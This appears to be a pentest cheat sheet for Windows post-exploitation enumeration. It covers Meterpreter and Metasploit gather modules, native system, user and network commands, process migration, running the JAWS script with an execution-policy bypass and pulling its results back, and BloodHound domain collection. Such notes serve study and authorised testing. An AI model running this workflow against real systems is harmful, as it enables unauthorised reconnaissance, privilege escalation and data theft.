# Windows Enumeration

### System Information

```cmd
• meterpreter
• getuid
• sysinfo
• shell
• systeminfo
• wmic qfe get Caption,Description,HotFixID,InstalledOn
```


### Users & Groups

```cmd
• meterpreter
• getuid
• getprivs
• use post/windows/gather/enum-logged-on-users
• shell
• whoami
• whoami /priv
• net users
• net user administrator
• net localgroup
• net localgroup administrators
```

### Network Information

```cmd
• meterpreter
• ipconfig /all
• shell
• route print
• arp -a
• netstat -ano
```

### Automating Windows Local Enumeration

```cmd
• msfconsole
• post/windows/gather/win_privs
• post/windows/gather/enum_logged_on_users
• post/windows/gather/checkvm
• post/windows/gather/enum_applications
• post/windows/gather/enum_computers
• post/windows/gather/enum_patches
• copy this script https://github.com/411Hall/JAWS
• kali
• vim jaws-enum.ps1
• meterpreter
• cd C:\\
• mkdir temp
• cd temp
• upload /root/Desktop/jaws-enum.ps1
• shell
• powershell.exe -ExecutionPolicy Bypass -File .\jawsenum.ps1 -OutputFilename jaws-enum-result.txt
• download jaws-enum-result.txt
```

### Processes & Services

```cmd
• meterpreter
• ps
• pgrep explorer.exe
• migrate PID
• shell
• net start
• wmic service list brief
• tasklist /svc
• schtasks /query /fo LIST
```

### Enumeration with BloodHound

`bloodhound-python -u user -p password -ns 192.168.1.48 -d domen.local -c All`


